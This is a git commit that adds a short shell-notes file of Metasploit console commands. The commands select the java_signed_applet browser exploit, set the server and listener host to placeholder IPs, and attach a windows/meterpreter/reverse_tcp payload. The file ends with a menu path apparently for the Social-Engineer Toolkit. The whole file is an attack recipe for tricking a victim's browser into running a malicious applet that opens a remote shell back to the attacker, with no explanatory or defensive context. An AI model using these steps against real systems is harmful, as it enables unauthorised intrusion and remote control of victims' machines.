5128cf73160851a3f93d76e60af99d10a970efa0
João Dematé Jr <joaodematejr@gmail.com>
2021-01-27 23:10:43 -0300

    atualização

---
+++ command/msfconsole/command.sh
@@ -0,0 +1,16 @@
+
+
+msfconsole
+search exploit java_signed_applet
+use exploit/multi/browser/java_signed_applet
+
+set SVRHOST IP
+set LHOST IP
+
+set URIPATH nomequalquer
+
+set PAYLOAD windows/meterpreter/reverse_tcp
+
+Social-Engineering Attacks
+
+1 => 2 => 1=> 2=>
